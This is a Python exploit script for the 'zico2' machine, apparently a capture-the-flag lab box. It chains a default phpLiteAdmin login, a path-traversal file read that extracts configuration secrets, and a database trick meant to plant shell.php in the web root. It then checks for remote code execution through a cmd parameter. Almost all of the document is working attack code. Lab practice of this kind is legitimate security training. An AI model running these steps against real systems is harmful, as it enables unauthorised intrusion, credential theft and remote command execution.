#!/usr/bin/env python3
"""zico2 RCE - Method 2: phpLiteAdmin SQL to write PHP file"""
import requests
import re

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'
PHPLITE = f'{BASE}/dbadmin/test_db.php'

# Login
print('[1] Login...')
s.post(PHPLITE, data={'password': 'admin', 'remember': 'on', 'login': 'Login', 'proc_login': 'true'})

# Create a new database with .php extension in the web root
# phpLiteAdmin stores databases in /usr/databases/ which is NOT web accessible
# We need to change the database directory to /var/www/html/ or similar

# Method: Try to change directory to web-accessible path
print('[2] Trying to change database directory to web root...')
# Look at how phpLiteAdmin handles directory changes
r = s.get(PHPLITE, timeout=15)

# Check if there's a directory field or setting
# phpLiteAdmin config is usually in the PHP file itself
# Let's read the phpLiteAdmin source code via LFI
print('[3] Reading phpLiteAdmin source via LFI to find config...')
lfi_paths = [
    '../../../var/www/html/dbadmin/test_db.php',
    '../var/www/html/dbadmin/test_db.php',
]

for p in lfi_paths:
    r = s.get(f'{BASE}/view.php?page={p}', timeout=10)
    if r.status_code == 200 and len(r.text) > 50 and 'Hacking' not in r.text:
        # Extract config values
        config_match = re.search(r'\$directory\s*=\s*["\']([^"\']+)["\']', r.text)
        if config_match:
            print(f'  Found $directory = {config_match.group(1)}')
        password_match = re.search(r'\$password\s*=\s*["\']([^"\']+)["\']', r.text)
        if password_match:
            print(f'  Found $password = {password_match.group(1)}')
        print(f'  File length: {len(r.text)} bytes')
        # Save source
        with open('phpliteadmin_source.txt', 'w') as f:
            f.write(r.text)
        print('  Saved to phpliteadmin_source.txt')
        break
else:
    print('  Could not read source via LFI')

# Method 3: Try to use the existing database to write PHP via SQLite
# SQLite has a writefile() function in newer versions, but not in older ones
# Instead, let's try SQL injection or direct database manipulation
print()
print('[4] Checking existing databases...')
r = s.get(PHPLITE, timeout=15)
# Find database names in the page
db_names = re.findall(r'href="[^"]*dbname=([^"&]+)', r.text)
print(f'  Databases found: {db_names}')

# Try to switch to a writable location
print()
print('[5] Trying to create DB in web root...')
# The directory field in phpLiteAdmin POST
r2 = s.post(PHPLITE, data={
    'proc_login': '',
    'proc_chdir': 'true',
    'directory': '/var/www/html/',
}, timeout=15)
print(f'  Change dir: {r2.status_code}')

# Check if directory changed
r3 = s.get(PHPLITE, timeout=15)
new_db_paths = re.findall(r'/[\w/.]+\.(db|sqlite|php)', r3.text)
print(f'  New db paths in page: {set(new_db_paths)}')

# If we can change directory, create shell.php there
r4 = s.post(PHPLITE, data={
    'proc_login': '',
    'dbname': 'shell.php',
    'proc_newdb': 'true',
    'newdbname': 'shell.php',
}, timeout=15)
print(f'  Create shell.php in new dir: {r4.status_code}')

# Test
r5 = s.get(f'{BASE}/shell.php?cmd=id', timeout=10)
print(f'  shell.php: {r5.status_code} ({len(r5.text)} bytes)')
if 'uid=' in r5.text:
    clean = re.sub(r'<[^>]+>', '', r5.text).strip()
    print(f'[+] RCE SUCCESS! {clean[:100]}')
